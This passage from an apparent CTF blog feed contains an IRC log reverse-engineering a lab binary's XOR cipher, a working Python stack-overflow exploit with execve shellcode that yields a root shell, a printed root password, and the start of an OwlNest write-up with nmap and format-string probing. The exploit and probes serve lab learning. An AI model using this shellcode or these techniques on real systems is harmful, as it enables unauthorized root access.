[2014-10-10T22:19:00+0100] &lt;c0ne&gt; make it hex please
[2014-10-10T22:20:52+0100] &lt;recrudesce&gt; -0x15E54E61
[2014-10-10T22:21:24+0100] &lt;c0ne&gt; yeah i just checked it
[2014-10-10T22:21:30+0100] &lt;c0ne&gt; its the init value indeed
[2014-10-10T22:21:47+0100] &lt;recrudesce&gt; ok, so the first key is 0x15E54E61 ?
[2014-10-10T22:21:53+0100] &lt;recrudesce&gt; represented as an unsigned int
[2014-10-10T22:21:58+0100] &lt;c0ne&gt; no
[2014-10-10T22:22:05+0100] &lt;c0ne&gt; unsigned indeed
[2014-10-10T22:22:11+0100] &lt;c0ne&gt; you show signed now
[2014-10-10T22:22:57+0100] &lt;recrudesce&gt; ah, so signed -367349345 (15E54E61) is EA1AB19F unsigned ?
[2014-10-10T22:23:04+0100] &lt;c0ne&gt; yes
[2014-10-10T22:23:06+0100] &lt;c0ne&gt; in ida
[2014-10-10T22:23:09+0100] &lt;c0ne&gt; press h
[2014-10-10T22:23:16+0100] &lt;c0ne&gt; when the value selected iirc
[2014-10-10T22:24:48+0100] &lt;recrudesce&gt; but it shows 3927617951, not -367349345
[2014-10-10T22:24:54+0100] &lt;recrudesce&gt; or am i being stupid ?
[2014-10-10T22:25:05+0100] &lt;c0ne&gt; and when you press h again
[2014-10-10T22:25:19+0100] &lt;recrudesce&gt; EA1AB19F
[2014-10-10T22:25:24+0100] &lt;recrudesce&gt; but why is the signed different ?
[2014-10-10T22:26:00+0100] &lt;c0ne&gt; it isnt
[2014-10-10T22:26:05+0100] &lt;c0ne&gt; its the same value
[2014-10-10T22:26:26+0100] &lt;recrudesce&gt; ok, i'm confused
[2014-10-10T22:26:37+0100] &lt;recrudesce&gt; in decompiled it shows as -367349345
[2014-10-10T22:26:38+0100] &lt;c0ne&gt; open win calc
[2014-10-10T22:26:52+0100] &lt;c0ne&gt; trow -367349345 in
[2014-10-10T22:26:57+0100] &lt;c0ne&gt; and switch to hex
[2014-10-10T22:27:03+0100] &lt;c0ne&gt; you will see
[2014-10-10T22:27:22+0100] &lt;recrudesce&gt; FFFFFFFEA1AB19F
[2014-10-10T22:27:30+0100] &lt;c0ne&gt; set it to dword
[2014-10-10T22:27:38+0100] &lt;c0ne&gt; strips the left 32 bits
[2014-10-10T22:27:40+0100] &lt;recrudesce&gt; ah ok
[2014-10-10T22:27:42+0100] &lt;recrudesce&gt; yeah, sorry
[2014-10-10T22:28:12+0100] &lt;recrudesce&gt; so that's the key in hex which is used as the key for the first 4 bytes
[2014-10-10T22:28:28+0100] &lt;recrudesce&gt; then something is happening to that hex value to make the next key
[2014-10-10T22:28:30+0100] &lt;c0ne&gt; its the base value indeed
[2014-10-10T22:28:35+0100] &lt;c0ne&gt; yes
[2014-10-10T22:29:31+0100] &lt;recrudesce&gt; ok, so it looks like you're putting that value into ebp+ -0Ch
[2014-10-10T22:30:25+0100] &lt;recrudesce&gt; looks like you're shifting it by 8
[2014-10-10T22:30:37+0100] &lt;recrudesce&gt; possibly ?
[2014-10-10T22:30:52+0100] &lt;c0ne&gt; more like shifting it by 1 , 8 times
[2014-10-10T22:31:21+0100] &lt;recrudesce&gt; what's the difference between shifting it by 1 8 times or shifting it by 8
[2014-10-10T22:32:42+0100] &lt;c0ne&gt; a2 &gt;&gt; 2
[2014-10-10T22:32:48+0100] &lt;c0ne&gt; is the same as
[2014-10-10T22:32:52+0100] &lt;c0ne&gt; a2 / 4
[2014-10-10T22:33:09+0100] &lt;recrudesce&gt; ok
[2014-10-10T22:35:15+0100] &lt;recrudesce&gt; bitwise operations
[2014-10-10T22:35:24+0100] &lt;c0ne&gt; yes
[2014-10-10T22:37:29+0100] &lt;recrudesce&gt; so this key, is it used as hex ?
[2014-10-10T22:37:36+0100] &lt;recrudesce&gt; or converted to something before use ?
[2014-10-10T22:38:28+0100] &lt;c0ne&gt; hex is only a presentation
[2014-10-10T22:38:41+0100] &lt;c0ne&gt; if you get me?
[2014-10-10T22:38:46+0100] &lt;recrudesce&gt; yeah
[2014-10-10T22:38:58+0100] &lt;recrudesce&gt; i'm just trying to work out how this xcrypt works
[2014-10-10T22:38:59+0100] &lt;c0ne&gt; its 32 bits value
[2014-10-10T22:40:14+0100] &lt;c0ne&gt; in assembly you cant realy determ how the value is intended
[2014-10-10T22:40:31+0100] &lt;c0ne&gt; signed or unsigned
[2014-10-10T22:40:45+0100] &lt;c0ne&gt; ah signed value ranges from 0 till 80000000
[2014-10-10T22:41:00+0100] &lt;c0ne&gt; where a unsigned ranges from 0 to ffffffff
[2014-10-10T22:42:59+0100] &lt;recrudesce&gt; i'm still trying to fathom out this xcrypt func
[2014-10-10T22:43:06+0100] &lt;c0ne&gt; normally the code kinda tells you how the value was intended
[2014-10-10T22:43:10+0100] &lt;recrudesce&gt; so it's taking file size, dividing by 4
[2014-10-10T22:43:13+0100] &lt;recrudesce&gt; looping that many times
[2014-10-10T22:43:30+0100] &lt;recrudesce&gt; *(_DWORD *)(a1 + 4 * i) = v3 ^ *(_DWORD *)(4 * i + a1);
[2014-10-10T22:43:40+0100] &lt;recrudesce&gt; for ( j = 0; j &lt;= 7; ++j )
[2014-10-10T22:43:49+0100] &lt;recrudesce&gt; {
[2014-10-10T22:43:49+0100] &lt;recrudesce&gt;       if ( v3 &amp; 1 )
[2014-10-10T22:43:49+0100] &lt;recrudesce&gt;         v3 = ((unsigned int)v3 &gt;&gt; 1) ^ 0x6DAA1CF4;
[2014-10-10T22:43:49+0100] &lt;recrudesce&gt;       else
[2014-10-10T22:43:49+0100] &lt;recrudesce&gt;         v3 = (unsigned int)v3 &gt;&gt; 1;
[2014-10-10T22:43:49+0100] &lt;recrudesce&gt;     }
[2014-10-10T22:43:49+0100] &lt;recrudesce&gt;   }
[2014-10-10T22:44:02+0100] &lt;c0ne&gt; hmm dress up you ida abit more
[2014-10-10T22:44:07+0100] &lt;c0ne&gt; for example
[2014-10-10T22:44:21+0100] &lt;c0ne&gt; select a1 and press y
[2014-10-10T22:44:25+0100] &lt;c0ne&gt; and change it to
[2014-10-10T22:44:32+0100] &lt;c0ne&gt; _DWORD *a1
[2014-10-10T22:44:40+0100] &lt;recrudesce&gt; hang on, i need to find a1
[2014-10-10T22:44:53+0100] &lt;c0ne&gt; in the function params
[2014-10-10T22:44:58+0100] &lt;c0ne&gt; int __cdecl xcrypt(_DWORD *a1, unsigned int a2)
[2014-10-10T22:45:13+0100] &lt;recrudesce&gt; my pseudocode is in a file
[2014-10-10T22:45:27+0100] &lt;c0ne&gt; aah that wont help then
[2014-10-10T22:45:31+0100] &lt;recrudesce&gt; ok, now it's in ida
[2014-10-10T22:45:35+0100] &lt;c0ne&gt; since the rest isnt changed then
[2014-10-10T22:46:07+0100] &lt;recrudesce&gt; ok, so i did that
[2014-10-10T22:46:32+0100] &lt;c0ne&gt; [23:43] &lt;recrudesce&gt; *(_DWORD *)(a1 + 4 * i) = v3 ^ *(_DWORD *)(4 * i + a1);
[2014-10-10T22:46:38+0100] &lt;recrudesce&gt; now shows as a1[1] ^= v3
[2014-10-10T22:46:39+0100] &lt;c0ne&gt; that looks abit better now i think?
[2014-10-10T22:46:40+0100] &lt;c0ne&gt; yes
[2014-10-10T22:46:46+0100] &lt;c0ne&gt; hmm
[2014-10-10T22:46:57+0100] &lt;c0ne&gt; now shows as a1[1] ^= v3 that a 1? in the array?
[2014-10-10T22:47:06+0100] &lt;recrudesce&gt; sorry, i
[2014-10-10T22:47:11+0100] &lt;c0ne&gt; k
[2014-10-10T22:47:12+0100] &lt;recrudesce&gt; a1[i]
[2014-10-10T22:47:14+0100] &lt;c0ne&gt; i was worried
[2014-10-10T22:47:31+0100] &lt;c0ne&gt; name that v3 key or so
[2014-10-10T22:47:39+0100] &lt;c0ne&gt; select &gt; n ..
[2014-10-10T22:48:03+0100] &lt;recrudesce&gt; name it to "key" ?
[2014-10-10T22:48:11+0100] &lt;c0ne&gt; yeah or whatever
[2014-10-10T22:48:16+0100] &lt;c0ne&gt; origenaly its called k
[2014-10-10T22:48:16+0100] &lt;recrudesce&gt; ok, done
[2014-10-10T22:48:28+0100] &lt;c0ne&gt; make its sometimes easier to read the whole thing
[2014-10-10T22:48:53+0100] &lt;recrudesce&gt; k is already in use it seems
[2014-10-10T22:49:10+0100] &lt;c0ne&gt; then use key :P
[2014-10-10T22:49:15+0100] &lt;recrudesce&gt; yeah, done it
[2014-10-10T22:49:53+0100] &lt;recrudesce&gt; {
[2014-10-10T22:49:53+0100] &lt;recrudesce&gt;       if ( v3 &amp; 1 )
[2014-10-10T22:49:53+0100] &lt;recrudesce&gt;         v3 = ((unsigned int)v3 &gt;&gt; 1) ^ 0x6DAA1CF4;
[2014-10-10T22:49:53+0100] &lt;recrudesce&gt;       else
[2014-10-10T22:49:53+0100] &lt;recrudesce&gt;         v3 = (unsigned int)v3 &gt;&gt; 1;
[2014-10-10T22:49:53+0100] &lt;recrudesce&gt;     }
[2014-10-10T22:49:53+0100] &lt;recrudesce&gt;   }
[2014-10-10T22:49:59+0100] &lt;c0ne&gt; so with the last bit of code stripped
[2014-10-10T22:50:05+0100] &lt;c0ne&gt; its kinda looks simple right?
[2014-10-10T22:50:08+0100] &lt;recrudesce&gt; yup, that's what i have
[2014-10-10T22:50:34+0100] &lt;c0ne&gt; so for every loop 0..7 it does a math check on the last key value
[2014-10-10T22:50:37+0100] &lt;c0ne&gt; the and 1
[2014-10-10T22:50:50+0100] &lt;c0ne&gt; and so chooses how the mutate the key
[2014-10-10T22:51:28+0100] &lt;c0ne&gt; try porting this into python or what you like
[2014-10-10T22:53:13+0100] &lt;recrudesce&gt; cant i just do this in C and make it echo the keys ?
[2014-10-10T22:53:22+0100] &lt;c0ne&gt; sure
[2014-10-10T22:53:26+0100] &lt;recrudesce&gt; rather than return 0, printf(key) ?
[2014-10-10T22:53:38+0100] &lt;c0ne&gt; but python is just as easy
[2014-10-10T22:53:45+0100] &lt;c0ne&gt; hmm now sure if you want that
[2014-10-10T22:53:51+0100] &lt;c0ne&gt; but yes i think is possible
[2014-10-10T22:54:02+0100] &lt;recrudesce&gt; ok, lets work this through in python
[2014-10-10T22:54:03+0100] &lt;c0ne&gt; but you will flood your screen
[2014-10-10T22:55:32+0100] &lt;recrudesce&gt; ok, so a1 is the content of the file
[2014-10-10T22:55:37+0100] &lt;recrudesce&gt; and a2 is the length of the file ?
[2014-10-10T22:55:38+0100] &lt;c0ne&gt; yes
[2014-10-10T22:55:41+0100] &lt;c0ne&gt; yes
[2014-10-10T22:56:56+0100] &lt;recrudesce&gt; ok, so i need to pass my python script a file
[2014-10-10T22:57:01+0100] &lt;recrudesce&gt; get the contents of it
[2014-10-10T22:57:04+0100] &lt;recrudesce&gt; and the length
[2014-10-10T22:57:56+0100] &lt;c0ne&gt; thats a way indeed
[2014-10-10T22:58:14+0100] &lt;c0ne&gt; easier is to generate the data youself
[2014-10-10T22:58:25+0100] &lt;c0ne&gt; data = 5000 * 'A'
[2014-10-10T22:59:05+0100] &lt;recrudesce&gt; ok, so a1 = 5000 * 'A'
[2014-10-10T22:59:07+0100] &lt;recrudesce&gt; a2 = 5000
[2014-10-10T22:59:19+0100] &lt;recrudesce&gt; key = -367349345
[2014-10-10T22:59:41+0100] &lt;c0ne&gt; go for the signed
[2014-10-10T22:59:47+0100] &lt;c0ne&gt;         key = ((unsigned int)key &gt;&gt; 1) ^ 0x6DAA1CF4;
[2014-10-10T22:59:47+0100] &lt;c0ne&gt;       else
[2014-10-10T22:59:47+0100] &lt;c0ne&gt;         key = (unsigned int)key &gt;&gt; 1;
[2014-10-10T22:59:54+0100] &lt;c0ne&gt; sorry unsigned
[2014-10-10T23:00:02+0100] &lt;c0ne&gt; the code tells you how its intended
[2014-10-10T23:15:14+0100] &lt;recrudesce&gt; so i have
[2014-10-10T23:15:22+0100] &lt;recrudesce&gt; key = 0xEA1AB19F
[2014-10-10T23:15:35+0100] &lt;recrudesce&gt; for i in range (0,a2/4,1) :
[2014-10-10T23:15:44+0100] &lt;recrudesce&gt;      print a1[i] ^ key
[2014-10-10T23:15:48+0100] &lt;recrudesce&gt; throws an error
[2014-10-10T23:15:56+0100] &lt;recrudesce&gt; TypeError: unsupported operand type(s) for ^: 'str' and 'long'
[2014-10-10T23:15:57+0100] &lt;c0ne&gt; yeah of course
[2014-10-10T23:16:02+0100] &lt;c0ne&gt; exactly
[2014-10-10T23:16:02+0100] &lt;recrudesce&gt; so i guess i have to cast key as long ?
[2014-10-10T23:16:07+0100] &lt;c0ne&gt; no
[2014-10-10T23:16:20+0100] &lt;c0ne&gt; your data, you don't treat is a integer
[2014-10-10T23:16:24+0100] &lt;recrudesce&gt; or cast my string as long ?
[2014-10-10T23:16:26+0100] &lt;c0ne&gt; str xor integer
[2014-10-10T23:16:50+0100] &lt;c0ne&gt; struct lib can help you
[2014-10-10T23:17:02+0100] &lt;recrudesce&gt; so i need to work out how to convert my string to an int
[2014-10-10T23:17:08+0100] &lt;recrudesce&gt; convert an A to an int :/
[2014-10-10T23:17:42+0100] &lt;c0ne&gt; x = struct.unpack_from('&lt;L', a1, (i * 4))
[2014-10-10T23:17:43+0100] &lt;c0ne&gt; or so
[2014-10-10T23:17:47+0100] &lt;c0ne&gt; in the loop
[2014-10-10T23:18:22+0100] &lt;recrudesce&gt; &lt;L ?
[2014-10-10T23:18:46+0100] &lt;c0ne&gt; little endian indeed
[2014-10-10T23:19:07+0100] &lt;recrudesce&gt; ok, so now i get tuple and long
[2014-10-10T23:19:21+0100] &lt;c0ne&gt; sorry
[2014-10-10T23:19:22+0100] &lt;recrudesce&gt; rather than string and long :P
[2014-10-10T23:19:25+0100] &lt;c0ne&gt;  x = struct.unpack_from('&lt;L', a1, (i * 4))[0]
[2014-10-10T23:19:27+0100] &lt;c0ne&gt; better
[2014-10-10T23:19:50+0100] &lt;recrudesce&gt; ah ok
[2014-10-10T23:19:52+0100] &lt;recrudesce&gt; cool
[2014-10-10T23:20:06+0100] &lt;c0ne&gt; btw
[2014-10-10T23:20:07+0100] &lt;c0ne&gt; for i in range (0,a2/4,1) :
[2014-10-10T23:20:14+0100] &lt;c0ne&gt; how does this works?
[2014-10-10T23:20:21+0100] &lt;recrudesce&gt; a2 is the length
[2014-10-10T23:20:23+0100] &lt;recrudesce&gt; 0 is start
[2014-10-10T23:20:26+0100] &lt;recrudesce&gt; 1 is step
[2014-10-10T23:20:29+0100] &lt;c0ne&gt; aah ok
[2014-10-10T23:20:34+0100] &lt;recrudesce&gt; so it'll step 1 from 0 to a2/4
[2014-10-10T23:20:43+0100] &lt;c0ne&gt; which is the same as
[2014-10-10T23:20:46+0100] &lt;recrudesce&gt; which is essentially what you're doing with v
[2014-10-10T23:20:47+0100] &lt;recrudesce&gt;  for ( i = 0; a2 &gt;&gt; 2 &gt; i; ++i )
[2014-10-10T23:20:52+0100] &lt;c0ne&gt; range(a2/4)
[2014-10-10T23:20:58+0100] &lt;recrudesce&gt; yeah, could do that too
[2014-10-10T23:21:04+0100] &lt;c0ne&gt; it confused me
[2014-10-10T23:21:57+0100] &lt;recrudesce&gt; if ( key &amp; 1 )
[2014-10-10T23:22:00+0100] &lt;recrudesce&gt; wossat doing ?
[2014-10-10T23:22:22+0100] &lt;c0ne&gt; check a bit is true or false
[2014-10-10T23:22:22+0100] &lt;recrudesce&gt; bitwise and
[2014-10-10T23:23:33+0100] &lt;c0ne&gt; &gt;&gt;&gt; for i in range(10):
[2014-10-10T23:23:34+0100] &lt;c0ne&gt; ...     print (i &amp; 1)
[2014-10-10T23:23:34+0100] &lt;c0ne&gt; ...
[2014-10-10T23:23:34+0100] &lt;c0ne&gt; 0
[2014-10-10T23:23:34+0100] &lt;c0ne&gt; 1
[2014-10-10T23:23:34+0100] &lt;c0ne&gt; 0
[2014-10-10T23:23:34+0100] &lt;c0ne&gt; 1
[2014-10-10T23:23:35+0100] &lt;c0ne&gt; 0
[2014-10-10T23:23:35+0100] &lt;c0ne&gt; 1
[2014-10-10T23:23:36+0100] &lt;c0ne&gt; 0
[2014-10-10T23:23:36+0100] &lt;c0ne&gt; 1
[2014-10-10T23:23:37+0100] &lt;c0ne&gt; 0
[2014-10-10T23:23:37+0100] &lt;c0ne&gt; 1
[2014-10-10T23:28:36+0100] &lt;c0ne&gt; now there where you do
[2014-10-10T23:28:37+0100] &lt;c0ne&gt; print x ^ key
[2014-10-10T23:28:59+0100] &lt;c0ne&gt; you could pack the result into a str again and append it to some output buffer
[2014-10-10T23:29:17+0100] &lt;c0ne&gt; something like
[2014-10-10T23:29:21+0100] &lt;c0ne&gt; outside the loop
[2014-10-10T23:29:24+0100] &lt;c0ne&gt; r = ''
[2014-10-10T23:29:50+0100] &lt;recrudesce&gt; outside which loop - the first or the 2nd ?
[2014-10-10T23:29:52+0100] &lt;c0ne&gt; replace the print with r += struct.pack('&lt;L', (x ^ key))
[2014-10-10T23:30:14+0100] &lt;c0ne&gt; out of the main loop
[2014-10-10T23:30:23+0100] &lt;c0ne&gt; since you have the declare a clean buffer
[2014-10-10T23:30:26+0100] &lt;c0ne&gt; empty
[2014-10-10T23:31:10+0100] &lt;recrudesce&gt; ok, done
[2014-10-10T23:31:18+0100] &lt;recrudesce&gt; then at the end, print r ?
[2014-10-10T23:31:22+0100] &lt;recrudesce&gt; after the entire loop
[2014-10-10T23:31:23+0100] &lt;c0ne&gt; yes
[2014-10-10T23:31:27+0100] &lt;c0ne&gt; or!
[2014-10-10T23:31:42+0100] &lt;c0ne&gt; open('myfile.tfc', 'wb').write( r )
[2014-10-10T23:31:52+0100] &lt;c0ne&gt; so you have it in the file
[2014-10-10T23:32:11+0100] &lt;c0ne&gt; you need it in a file anyways 
[2014-10-10T23:32:26+0100] &lt;recrudesce&gt; ok, i just encrypted 5000 A's
[2014-10-10T23:32:36+0100] &lt;recrudesce&gt; and it looks like it did it
[2014-10-10T23:33:00+0100] &lt;c0ne&gt; feed it to the binary
[2014-10-10T23:33:06+0100] &lt;c0ne&gt; and see what happens
[2014-10-10T23:33:21+0100] &lt;recrudesce&gt; seg fault
[2014-10-10T23:33:32+0100] &lt;c0ne&gt; on..
[2014-10-10T23:34:01+0100] &lt;recrudesce&gt; 0x4f04c41c
[2014-10-10T23:34:14+0100] &lt;c0ne&gt; hmm
[2014-10-10T23:34:21+0100] &lt;c0ne&gt; try 6000 A
[2014-10-10T23:34:25+0100] &lt;c0ne&gt; for a test
[2014-10-10T23:34:41+0100] &lt;c0ne&gt; the original buffer is 4096
[2014-10-10T23:34:50+0100] &lt;c0ne&gt; now that very close to that 5000
[2014-10-10T23:35:26+0100] &lt;c0ne&gt; ooh btw
[2014-10-10T23:35:33+0100] &lt;c0ne&gt; i see a bug in your code
[2014-10-10T23:35:42+0100] &lt;c0ne&gt; for ( j = 0; j &lt;= 7; ++j )
[2014-10-10T23:35:48+0100] &lt;c0ne&gt; 0 ..7 is 8
[2014-10-10T23:35:50+0100] &lt;c0ne&gt; rounds
[2014-10-10T23:35:56+0100] &lt;c0ne&gt; for j in range(7):
[2014-10-10T23:36:00+0100] &lt;c0ne&gt; this is 7 rounds
[2014-10-10T23:36:29+0100] &lt;c0ne&gt; j &lt;= 7
[2014-10-10T23:36:35+0100] &lt;c0ne&gt; less or equal
[2014-10-10T23:36:47+0100] &lt;recrudesce&gt; but it starts at 0
[2014-10-10T23:36:49+0100] &lt;c0ne&gt; if it did j &lt; 7 it would be 7 rounds
[2014-10-10T23:37:07+0100] &lt;recrudesce&gt; so i need to do 6 then
[2014-10-10T23:37:13+0100] &lt;c0ne&gt; no
[2014-10-10T23:37:17+0100] &lt;c0ne&gt; 8
[2014-10-10T23:37:23+0100] &lt;c0ne&gt; for j in range(8)
[2014-10-10T23:37:36+0100] &lt;c0ne&gt; that will go from 0 .. up till 7
[2014-10-10T23:37:40+0100] &lt;c0ne&gt; which is 8 rounds
[2014-10-10T23:37:49+0100] &lt;c0ne&gt; since the 0 counts to
[2014-10-10T23:38:09+0100] &lt;recrudesce&gt; segfault at 41414141
[2014-10-10T23:38:09+0100] &lt;recrudesce&gt; nice
[2014-10-10T23:38:25+0100] &lt;c0ne&gt; now from here on i made it easy
[2014-10-10T23:38:30+0100] &lt;c0ne&gt; exec stack
[2014-10-10T23:38:38+0100] &lt;c0ne&gt; and even added some little helper
[2014-10-10T23:40:14+0100] &lt;recrudesce&gt; so it's one way encryption
[2014-10-10T23:40:19+0100] &lt;recrudesce&gt; but you can encrypt encrypted files to decrypt
[2014-10-10T23:40:23+0100] &lt;recrudesce&gt; hahaha
[2014-10-10T23:40:26+0100] &lt;c0ne&gt; yes
[2014-10-10T23:40:27+0100] &lt;c0ne&gt; xor
[2014-10-10T23:40:36+0100] &lt;c0ne&gt; with a key mutation
[2014-10-10T23:40:53+0100] &lt;c0ne&gt; if i used a static key of for example 16 bytes
[2014-10-10T23:41:06+0100] &lt;c0ne&gt; you could see some pattern in the encrypted data
[2014-10-10T23:41:14+0100] &lt;c0ne&gt; kinda revealing the key
[2014-10-10T23:41:24+0100] &lt;c0ne&gt; so that why added a bit of math
[2014-10-10T23:43:04+0100] &lt;c0ne&gt; you can also make it leak the key
[2014-10-10T23:43:12+0100] &lt;c0ne&gt; feed it a file with 00 bytes
[2014-10-10T23:45:34+0100] &lt;recrudesce&gt; eip is at 4124
[2014-10-10T23:46:29+0100] &lt;c0ne&gt; yes
[2014-10-10T23:48:06+0100] &lt;recrudesce&gt; ok, have control of EIP
[2014-10-10T23:49:35+0100] &lt;c0ne&gt; now whats next ..
[2014-10-10T23:50:04+0100] &lt;recrudesce&gt; ok, so ret2lib i guess ?
[2014-10-10T23:50:13+0100] &lt;c0ne&gt; naah
[2014-10-10T23:50:16+0100] &lt;c0ne&gt; even more simple
[2014-10-10T23:50:29+0100] &lt;c0ne&gt; stack is executable
[2014-10-10T23:50:38+0100] &lt;c0ne&gt; no need for fancy rops
[2014-10-10T23:50:40+0100] &lt;recrudesce&gt; jump to esp
[2014-10-10T23:50:46+0100] &lt;c0ne&gt; yeah
[2014-10-10T23:52:15+0100] &lt;c0ne&gt; msfelfscan -j esp binaryfile
[2014-10-10T23:53:55+0100] &lt;c0ne&gt; asm ("jmp %esp");
[2014-10-10T23:54:00+0100] &lt;c0ne&gt; added it on purpose
[2014-10-10T23:54:06+0100] &lt;c0ne&gt; i'm not that evil
[2014-10-10T23:57:50+0100] &lt;c0ne&gt; since there isnt any more tricks down the way
</code></pre>

<p>So, now that you read that, this is what my Python script looks like</p>

<pre><code class="python">#!/bin/python
import sys
import struct
#a1 = file contents
#a2 = file length

#f = open('input_buff.tfc', 'r')
#a1 = f.read()
#a2 = len(a1)

ret = '\x93\x8e\x04\x08' #08048d93
shellcode = "\xeb\x18\x5e\x31\xc0\x88\x46\x09\x89\x76\x0a\x89\x46\x0e\xb0\x0b\x89\xf3\x8d\x4e\x0a\x8d\x56\x0e\xcd\x80\xe8\xe3\xff\xff\xff\x2f\x62\x69\x6e\x2f\x64\x61\x73\x68\x41\x42\x42\x42\x42\x43\x43\x43\x43"
a1 = 'A'*4124 + ret + '\x90' * 10 + shellcode
l = len(a1) % 4
for m in range(l):
        a1 += 'Z'

a2 = len(a1)

key = 0xEA1AB19F
r=''
# now do the first for loop
for i in range(a2/4):
        x = struct.unpack_from('&lt;L', a1, (i * 4))[0]
        #print x ^ key
        r += struct.pack('&lt;L', (x ^ key))
        for j in range(8):
                if (key &amp; 1):
                        key = (key &gt;&gt; 1) ^ 0x6DAA1Cf4
                else:
                        key = key &gt;&gt; 1
open('myfile.tfc', 'wb').write( r )
</code></pre>

<p>This generates a .tfc file, which when provided to the tfc application &ldquo;decrypts&rdquo;, jumps to esp and executes the shellcode, dropping us to a shell.</p>

<pre><code class="bash">jason@knockknock:~$ python keyshow.py
jason@knockknock:~$ ./tfc ./myfile.tfc ./myfile_blah.tfc
# id
uid=1000(jason) gid=1000(jason) euid=0(root) groups=0(root),24(cdrom),25(floppy),29(audio),30(dip),44(video),46(plugdev),1000(jason)
# cd /root
# ls -l
total 16
-rw-r--r-- 1 root root 1459 Oct 11 18:04 crpt.py
-rwxr-xr-x 1 root root 1027 Oct 10 18:19 server.py
-rwxr-xr-x 1 root root  119 Sep 26 12:10 start.sh
drwxr-xr-x 2 root root 4096 Oct 10 20:55 the_flag_is_in_here
# cd the_flag_is_in_here
ls -l
# total 4
-rw-r--r-- 1 root root 895 Oct 10 20:55 qQcmDWKM5a6a3wyT.txt
# cat qQcmDWKM5a6a3wyT.txt
 __                         __              __                         __      ____
|  | __ ____   ____   ____ |  | __         |  | __ ____   ____   ____ |  | __ /_   |
|  |/ //    \ /  _ \_/ ___\|  |/ /  ______ |  |/ //    \ /  _ \_/ ___\|  |/ /  |   |
|    &lt;|   |  (  &lt;_&gt; )  \___|    &lt;  /_____/ |    &lt;|   |  (  &lt;_&gt; )  \___|    &lt;   |   |
|__|_ \___|  /\____/ \___  &gt;__|_ \         |__|_ \___|  /\____/ \___  &gt;__|_ \  |___|
     \/    \/            \/     \/              \/    \/            \/     \/       

Hooray you got the flag!

Hope you had as much fun r00ting this as I did making it!

Feel free to hit me up in #vulnhub @ zer0w1re

Gotta give a big shout out to c0ne, who helpped to make the tfc binary challenge,
as well as rasta_mouse, and recrudesce for helping to find bugs and test the VM :)

root password is "qVx4UJ*zcUdc9#3C$Q", but you should already have a shell, right? ;)
#
</code></pre>

<p><img src="http://halloffamejay.com/wp-content/uploads/2013/10/muppet.gif" alt="" /></p>
]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[Owl Up In My Grill]]></title>
    <link href="http://recrudesce.github.io/2014/10/26/owl-up-in-my-grill/"/>
    <updated>2014-10-26T17:16:50+00:00</updated>
    <id>http://recrudesce.github.io/2014/10/26/owl-up-in-my-grill</id>
    <content type="html"><![CDATA[<p>So, while we were all sitting in #vulnhub (on Freenode) waiting for <a href="https://twitter.com/superkojiman">superkojiman</a> to release Persistence, <a href="https://twitter.com/swappage">Swappage</a> released <a href="vulnhub.com/entry/owlnest-102,102/">OwlNest</a>. I thought, what the hell, might as well use it to pass the time, right ? I was, however, not expecting it to take me 4 days&hellip;</p>

<!-- more -->


<h2>Were You Born in a Barn (Owl) ?</h2>

<p>A quick dig around using NMAP</p>

<pre><code class="bash">root@pwk:/var/www# nmap -sS -O -p1-65535 --script banner 172.16.56.131 -P0

Starting Nmap 6.47 ( http://nmap.org ) at 2014-09-01 22:49 BST
Nmap scan report for 172.16.56.131
Host is up (0.00034s latency).
Not shown: 65530 closed ports
PORT      STATE SERVICE
22/tcp    open  ssh
|_banner: SSH-2.0-OpenSSH_6.0p1 Debian-4+deb7u2
80/tcp    open  http
111/tcp   open  rpcbind
31337/tcp open  Elite
| banner: (\___/)   (\___/)   (\___/)   (\___/)   (\___/)   (\___/)\x0D\x
|_0A        /0\ /0\   /o\ /o\   /0\ /0\   /O\ /O\   /o\ /o\   /0\ /0\\...
34895/tcp open  unknown
MAC Address: 00:0C:29:9A:51:B8 (VMware)
Device type: general purpose
Running: Linux 3.X
OS CPE: cpe:/o:linux:linux_kernel:3
OS details: Linux 3.2 - 3.10
Network Distance: 1 hop

OS detection performed. Please report any incorrect results at http://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 8.87 seconds
root@pwk:/var/www#
</code></pre>

<p>Looks like there&rsquo;s a banner on port 31337, might as well get all of it, and see if the service behind it is vulnerable to format string.</p>

<pre><code class="bash">root@pwk:/var/www# nc -nv 172.16.56.131 31337
nc: 172.16.56.131 31337 open
        (\___/)   (\___/)   (\___/)   (\___/)   (\___/)   (\___/)
        /0\ /0\   /o\ /o\   /0\ /0\   /O\ /O\   /o\ /o\   /0\ /0\
        \__V__/   \__V__/   \__V__/   \__V__/   \__V__/   \__V__/
       /|:. .:|\ /|;, ,;|\ /|:. .:|\ /|;, ,;|\ /|;, ,;|\ /|:. .:|\
       \\:::::// \\;;;;;// \\:::::// \\;;;;;// \\;;;;;// \\::::://
   -----`"" ""`---`"" ""`---`"" ""`---`"" ""`---`"" ""`---`"" ""`---
        \__V__/   \__V__/   \__V__/   \__V__/   \__V__/   \__V__/

This is the OwlNest Administration console

Type Help for a list of available commands.

Ready: %s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%Ss
Ready: help

Syntax: command &lt;argument&gt;

help         This help
username     Specify your login name
password     Specify your password
privs    Specify your access level
login        login to shell with specified username and password

Ready:
</code></pre>

<p>This looks like something we&rsquo;ll need a username and password for. As none are known, this port is being ignored for now. Port 80&rsquo;s where it&rsquo;s at then.</p>

<p><a href="http://fourfourfourfour.co/wp-content/uploads/2014/09/owlnest_001.png"><img src="http://fourfourfourfour.co/wp-content/uploads/2014/09/owlnest_001.png" alt="owlnest_001" /></a></p>

<p>The Register link allows us to create a new user, which we can use to log in and look around</p>

<p><a href="http://fourfourfourfour.co/wp-content/uploads/2014/09/owlnest_002.png"><img src="http://fourfourfourfour.co/wp-content/uploads/2014/09/owlnest_002.png" alt="owlnest_002" /></a></p>

<p>But it seems we&rsquo;re not allowed to use the Upload feature, because we&rsquo;re not &ldquo;admin&rdquo;. An interesting point to note here is that the URL for the Upload feature is <a href="http://172.16.56.131/uploadform.php?page=forms/form.php,">http://172.16.56.131/uploadform.php?page=forms/form.php,</a> which means we could possibly leverage it for LFI. No other links on the site work in this way.</p>

<p>Looking at the source for the registration page, it seems the username is capped at 16 characters.</p>

<p>&#8220;` html</p>

<div class="form-group">
                <label for="nome" class="col-sm-2 col-lg-2 control-label">Login Name:</label>
                <div class="col-sm-5 col-lg-5">
                    <input type="text" class="form-control" maxlength="16" name="username" id="username" placeholder="Choose a Login name...">
                </div>
            </div>


<pre><code>
